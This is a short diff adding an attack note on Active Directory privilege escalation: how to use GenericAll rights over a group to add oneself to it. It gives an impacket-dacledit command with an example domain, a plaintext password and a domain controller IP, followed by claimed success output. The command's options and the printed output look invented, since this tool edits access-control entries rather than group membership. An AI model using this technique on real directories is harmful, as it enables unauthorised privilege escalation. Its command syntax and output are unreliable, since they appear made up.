@@ -1,0 +1,22 @@
+You can use this script to modify AD objects.
+
+EX.
+
+If you have GenericAll over a group, use this to add yourself to the group.
+
+impacket-dacledit \
+  -action write \
+  -rights 'Member' \
+  -target-sid S-1-5-21-1111111111-2222222222-3333333333-1105 \
+  -object 'CN=Helpdesk,OU=Groups,DC=corp,DC=local' \
+  corp.local/alice:Spring2024! \
+  -dc-ip 10.10.10.5
+
+EXPECTED OUTPUT
+
+[*] Bind OK
+[*] Reading object CN=Helpdesk,OU=Groups,DC=corp,DC=local
+[*] Current members: [...]
+[*] Adding member SID: S-1-5-21-...-1105
+[*] Modifying object...
+[*] Success!
